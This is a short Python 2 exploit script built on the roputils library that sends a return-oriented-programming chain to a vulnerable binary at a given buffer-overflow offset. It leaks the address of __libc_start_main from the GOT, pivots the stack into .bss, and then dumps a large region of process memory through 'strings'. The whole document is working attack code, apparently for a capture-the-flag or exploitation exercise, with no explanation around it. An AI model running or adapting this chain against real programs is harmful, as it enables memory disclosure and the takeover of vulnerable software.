from roputils import *

fpath = sys.argv[1]
offset = int(sys.argv[2])

rop = ROP(fpath)
addr_stage = rop.section('.bss') + 0x400

buf = rop.retfill(offset)
buf += rop.call('write', 1, rop.got('__libc_start_main'), 4)
buf += rop.call('read', 0, addr_stage, 100)
buf += rop.pivot(addr_stage)

p = Proc(rop.fpath)
p.write(p32(len(buf)) + buf)
print "[+] read: %r" % p.read(len(buf))
ref_addr = p.read_p32()

buf = rop.call('write', 1, ref_addr, 0x200000)
buf += rop.fill(100, buf)

p.write(buf)
print p.pipe_output('strings', '-tx')
p.close()
